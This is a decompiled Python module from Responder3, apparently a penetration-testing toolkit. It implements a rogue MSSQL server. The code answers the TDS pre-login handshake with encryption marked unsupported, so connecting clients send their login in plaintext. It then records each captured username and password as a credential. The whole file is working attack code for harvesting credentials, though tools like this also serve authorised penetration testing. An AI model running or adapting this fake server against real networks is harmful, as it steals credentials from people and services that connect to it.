# uncompyle6 version 3.7.4
# Python bytecode 3.7 (3394)
# Decompiled from: Python 3.6.9 (default, Apr 18 2020, 01:56:04) 
# [GCC 8.4.0]
# Embedded file name: build\bdist.win-amd64\egg\responder3\servers\MSSQL.py
# Compiled at: 2019-04-29 07:33:30
# Size of source mod 2**32: 2718 bytes
import enum, logging, asyncio, os
from responder3.core.logging.logger import *
from responder3.core.asyncio_helpers import R3ConnectionClosed
from responder3.core.commons import *
from responder3.protocols.MSSQL import *
from responder3.core.servertemplate import ResponderServer, ResponderServerSession
from responder3.core.logging.log_objects import Credential

class MSSQLSession(ResponderServerSession):

    def __init__(self, connection, log_queue):
        ResponderServerSession.__init__(self, connection, log_queue, self.__class__.__name__)
        self.status = SessionStatus.START


class MSSQL(ResponderServer):

    def init(self):
        pass

    async def send_data(self, data):
        self.cwriter.write(data)
        await self.cwriter.drain()

    @r3trafficlogexception
    async def run(self):
        while not self.shutdown_evt.is_set():
            try:
                result = await (asyncio.gather)(*[TDSPacket.from_streamreader((self.creader), timeout=None)], **{'return_exceptions': True})
            except asyncio.CancelledError as e:
                try:
                    raise e
                finally:
                    e = None
                    del e

            if isinstance(result[0], R3ConnectionClosed):
                return
            elif isinstance(result[0], Exception):
                raise result[0]
            else:
                packet = result[0]
            if self.session.status == SessionStatus.START:
                if packet.type != PacketType.PRELOGIN:
                    raise Exception('Unexpected packet type! %s ' % packet.type)
                self.session.status = SessionStatus.PREAUTH_SENT
                data = PRELOGIN()
                data.version = b'\x11\x02\x00\x00\x00\x00'
                data.encryption = Encryption.NOT_SUP
                data.instvalidity = ''
                data.thread_id = 0
                data.mars = False
                data.fedauthrequired = False
                data.traceid = os.urandom(32)
                rp = TDSPacket()
                rp.type = PacketType.TABULAR_RESULT
                rp.status = PacketStatus.EOM
                rp.spid = 0
                rp.packet_id = 1
                rp.window = 0
                rp.data = data
                await self.send_data(rp.to_bytes())
                continue
            elif self.session.status == SessionStatus.PREAUTH_SENT:
                if packet.type == PacketType.LOGIN7:
                    cred = Credential('plaintext',
                      username=(packet.data.username),
                      password=(packet.data.password),
                      fullhash=('%s:%s' % (packet.data.username, packet.data.password)))
                    await self.logger.credential(cred)
                    return
                if packet.type == PacketType.SSPI:
                    self.session.status = SessionStatus.SSPI_AUTH
                    return
            else:
                raise Exception('Unexpected packet at this stage!')